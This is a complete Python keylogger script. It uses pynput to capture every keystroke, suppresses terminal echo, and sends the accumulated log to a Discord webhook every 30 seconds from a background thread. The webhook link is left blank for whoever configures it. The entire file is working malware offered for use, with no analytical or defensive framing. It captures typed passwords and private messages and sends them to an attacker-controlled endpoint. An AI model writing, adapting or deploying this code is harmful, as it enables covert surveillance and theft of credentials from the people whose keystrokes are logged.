from pynput import keyboard
from time import sleep
import subprocess, requests, threading

try:
    subprocess.call('stty -echo', shell = True)
    subprocess.call('clear', shell = True)
except:
    subprocess.call('cls', shell = True)

# Settings ----------------------------
# Link of your Discord channel webhook
webhook = ''
# Send keylogs every...
interval = 30
# --------------------------------------

log = ''
alt_gr = False
def on_press(key):
    global log, alt_gr
    if key == keyboard.Key.enter:
        log += "\n"
    elif key == keyboard.Key.tab:
        log += "\t"
    elif str(key) == "<65437>":
        log += "5"
    elif str(key) == "<65027>":
        # log += "~"
        alt_gr = True
    elif key == keyboard.Key.space:
        log += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(log) == 0:
        pass
    elif key == keyboard.Key.backspace and len(log) > 0:
        log = log[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        pass
    else:
        log += str(key).strip("'")
    try:
        if log[-1] == '0' and alt_gr == True:
            log = log[:-1]
            log += '@'
        elif log[-1] == '3' and alt_gr == True:
            log = log[:-1]
            log += '#'
    except:
        pass
    subprocess.call('clear',shell=True)
    print(log)

def on_release(key):
    global log, alt_gr
    if str(key) == "<65027>":
        alt_gr = False

def send_data():
    global log, webhook, interval
    while True:
        requests.post(webhook, json={"content": log})
        sleep(interval)

t1 = threading.Thread(target=send_data)
t1.start()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
